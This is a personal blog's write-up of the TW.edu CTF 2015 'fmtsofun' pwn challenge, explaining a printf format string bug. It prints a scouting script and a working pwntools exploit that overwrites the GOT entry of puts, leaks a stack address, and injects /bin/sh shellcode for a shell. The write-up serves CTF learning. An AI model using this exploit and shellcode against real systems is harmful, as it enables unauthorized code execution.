<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>TW.edu CTF 2015: fmtsofun (pwn 150) | Isaac's Blog</title><link rel="stylesheet" type="text/css" href="/css/normalize.css"><link rel="stylesheet" type="text/css" href="/css/very-simple.css"><link rel="stylesheet" type="text/css" href="/css/solarized-dark.css"><link rel="stylesheet" type="text/css" href="/css/my.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><!-- include the sidebar--><!-- include ./includes/sidebar.jade--><!-- Blog title and subtitle--><header><div class="container header"><a id="logo" href="/." class="title">Isaac's Blog</a><span class="subtitle">The force is with those who read the source.</span><label id="toggle-menu" for="menu" onclick><i class="fa fa-bars"></i></label></div></header><!-- use checkbox hack for toggle nav-bar on small screens--><input id="menu" type="checkbox"><!-- Navigation Links--><nav id="nav"><div class="container"><a href="/" class="sidebar-nav-item active">Home</a><a href="/archives/" class="sidebar-nav-item">Archives</a><a href="/about/" class="sidebar-nav-item">About</a></div></nav><div id="header-margin-bar"></div><!-- gallery that comes before the header--><div class="wrapper"><div class="container post-header"><h1>TW.edu CTF 2015: fmtsofun (pwn 150)</h1></div></div><div class="wrapper"><div class="container meta"><div class="post-time">2016-02-18</div><div class="post-categories"><a class="post-category-link" href="/categories/writeup/">writeup</a></div><div class="post-tags"><a class="post-tag-link" href="/tags/TW-edu-CTF/">TW.edu CTF</a>/<a class="post-tag-link" href="/tags/format-string/">format string</a>/<a class="post-tag-link" href="/tags/pwn/">pwn</a></div></div></div><article><div class="container post"><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>

<p>Do you know format string attack ?<br>nc pwning.pwnable.tw 56026<br><a href="/2016/02/18/fmtsofun/fmtsofun" title="binary">binary</a><br><strong>Hint:</strong><br>%n is so powerful</p>
</blockquote>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight x86asm"><figcaption><span>fmtsofun</span></figcaption><table><tr><td class="code"><pre><span class="hljs-symbol">.text:</span><span class="hljs-number">0x80486C7</span>  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>], offset format <span class="hljs-comment">; "Enter your format string :"</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x80486CE</span>  <span class="hljs-keyword">call</span>   _printf<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x80486D3</span>  <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">esp</span>+<span class="hljs-number">1Ch</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x80486D7</span>  <span class="hljs-keyword">mov</span>    [<span class="hljs-built_in">esp</span>+<span class="hljs-number">4</span>], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x80486DB</span>  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>], offset a79s <span class="hljs-comment">; "%79s"</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x80486E2</span>  <span class="hljs-keyword">call</span>   ___isoc99_scanf<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x80486E7</span>  <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">esp</span>+<span class="hljs-number">1Ch</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x80486EB</span>  <span class="hljs-keyword">mov</span>    [<span class="hljs-built_in">esp</span>], <span class="hljs-built_in">eax</span>      <span class="hljs-comment">; format</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x80486EE</span>  <span class="hljs-keyword">call</span>   _printf<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x80486F3</span>  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>], offset aHappyNewYear <span class="hljs-comment">; "\nHappy New Year !!"</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x80486FA</span>  <span class="hljs-keyword">call</span>   _puts<br></pre></td></tr></table></figure>
<p>As the program’s message suggests, the main purpose of this program is to let us launch a format string attack. I first use <code>fmtsofun_scout.py</code> to calibrate the argument number and padding of the input buffer.</p>
<figure class="highlight python"><figcaption><span>fmtsofun_scout.py</span><a href="/2016/02/18/fmtsofun/fmtsofun_scout.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwnlib.tubes.remote <span class="hljs-keyword">import</span> remote<br><span class="hljs-keyword">from</span> pwnlib.util.packing <span class="hljs-keyword">import</span> p32<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">from</span> libformatstr <span class="hljs-keyword">import</span> make_pattern, guess_argnum<br><br>buf_size = <span class="hljs-number">79</span><br><br>r = remote(<span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-number">4444</span>)<br><br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">':'</span>)<br>r.sendline(make_pattern(buf_size))<br>result = r.recvall()<br><span class="hljs-keyword">print</span> result<br><span class="hljs-keyword">print</span> <span class="hljs-string">"argnum:{}, padding:{}"</span>.format(*guess_argnum(result, buf_size))<br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre>$ python fmtsofun_scout.py <br>Format string attack is so fun<br>Enter your format string :<br>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab10xfff7f3bc0x336141320x702439250x362570240xfff7f4b40xf7727000(nil)0x80484f00xf775f130<br>Happy New Year !!<br><br>argnum:7, padding:0<br></pre></td></tr></table></figure>
<p>With these information, we can now successfully perform the format string attack. However, this program only allow us to launch the attack once, which is not enough for us to both leak the address of stack and jump to the shellcode. To deal with this situation, I use GOT hijacking to make <code>puts</code> library call jumps to the address right brfore the bug. (Actually, I jump back to the point which is going to print the message “Enter your format string :” because it is easier to check wether the jump is success) Now we can lanuch the format string attack multiple times.</p>
<p>When I hijack the GOT entry of <code>puts</code> above, I also use <code>%33$x</code> to leak the 33rd argument on the stack, whose value seems to have a fix offset to the address of input buffer (I call it stack debris in my exploit) that allows us to calculate the address of the shellcode. After calculating the shellcode address, I use the same format string attack to hijack GOT entry of <code>puts</code> and jump to the shellcode.</p>
<figure class="highlight python"><figcaption><span>fmtsofun_exp.py</span><a href="/2016/02/18/fmtsofun/fmtsofun_exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwnlib.tubes.remote <span class="hljs-keyword">import</span> remote<br><span class="hljs-keyword">from</span> pwnlib.util.packing <span class="hljs-keyword">import</span> p32<br><span class="hljs-keyword">from</span> libformatstr <span class="hljs-keyword">import</span> FormatStr<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br>argnum = <span class="hljs-number">7</span><br>padding = <span class="hljs-number">0</span><br>puts_got = <span class="hljs-number">0x08049A48</span><br>print_addr = <span class="hljs-number">0x080486C7</span><br>no_whitespace_shellcode = <span class="hljs-string">'\x31\xc0\xb0\x30\x01\xc4\x30\xc0\x50\x68\x2f\x2f\x73\x68'</span> \<br>                          <span class="hljs-string">'\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xb0\xb0\xc0\xe8\x04'</span> \<br>                          <span class="hljs-string">'\xcd\x80\xc0\xe8\x03\xcd\x80'</span><br><br>r = remote(<span class="hljs-string">'pwning.pwnable.tw'</span>, <span class="hljs-number">56026</span>)<br><br><span class="hljs-comment"># Change the GOT entry of puts to the address right before the</span><br><span class="hljs-comment"># format string bug and leak some information about stack at</span><br><span class="hljs-comment"># the same time. This allows us to exploit the same bug again</span><br><span class="hljs-comment"># with all information needed.</span><br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">':'</span>)<br>fmt = FormatStr()<br>fmt[puts_got] = print_addr<br>r.sendline(fmt.payload(argnum, padding) + <span class="hljs-string">'%33$x'</span>)<br><br><span class="hljs-comment"># Calculate the address where the shellcode is going to be placed</span><br><span class="hljs-comment"># from the information leaked by the format string '%33$x' above.</span><br>result = r.recvuntil(<span class="hljs-string">':'</span>)<br><span class="hljs-keyword">print</span> result<br><span class="hljs-keyword">print</span> <span class="hljs-string">'stack debris:'</span>, result[<span class="hljs-number">-34</span>:<span class="hljs-number">-26</span>]<br>shellcode_addr = int(result[<span class="hljs-number">-34</span>:<span class="hljs-number">-26</span>], <span class="hljs-number">16</span>) - <span class="hljs-number">216</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">'shellcode address:'</span>, hex(shellcode_addr)<br><br><span class="hljs-comment"># Change the GOT entry of puts to the address of the shellcode</span><br>fmt = FormatStr()<br>fmt[puts_got] = shellcode_addr<br>r.sendline(fmt.payload(argnum, padding) + no_whitespace_shellcode)<br><br>sleep(<span class="hljs-number">0.5</span>)<br>r.interactive()<br></pre></td></tr></table></figure>
<blockquote>
<p>Flag: <code>CTF{F0Rm4t_s7r!n6_!s_4wes0m3}</code></p>
</blockquote>
</div><!-- comment system--><div class="container"><hr><div id="disqus_thread"></div><script type="text/javascript">
var disqus_shortname = 'poning';
var disqus_identifier = '2016/02/18/fmtsofun/';
var disqus_title = 'TW.edu CTF 2015: fmtsofun (pwn 150)';
var disqus_url = 'http://poning.me/2016/02/18/fmtsofun/';
(function() {
   var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
   dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
   (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">Blog comments powered by <span class="logo-disqus">Disqus</span></a></div></article><footer id="footer"><div class="container"><div class="bar"><div class="social"><a href="mailto:i@poning.me" target="_blank"><i class="fa fa-envelope-o"></i></a><a href="https://github.com/Isaac0616" target="_blank"><i class="fa fa-github"></i></a><a href="/atom.xml" target="_blank"><i class="fa fa-rss"></i></a></div><div class="footer">© 2017 <a href="/" rel="nofollow">Isaac Tseng</a>. Powered by <a rel="nofollow" target="_blank" href="https://hexo.io">Hexo</a>. Theme <a target="_blank" href="https://github.com/lotabout/very-simple">very-simple</a>.</div></div></div></footer><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css"><script src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js"></script><script src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script>$(document).ready(function() {
    $(".fancybox").fancybox();
});
</script>
<!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<!-- End: Injected MathJax -->

<!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<!-- End: Injected MathJax -->
</body><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
e=o.createElement(i);r=o.getElementsByTagName(i)[0];
e.src='//www.google-analytics.com/analytics.js';
r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
ga('create','UA-86477289-1');ga('send','pageview');</script></html>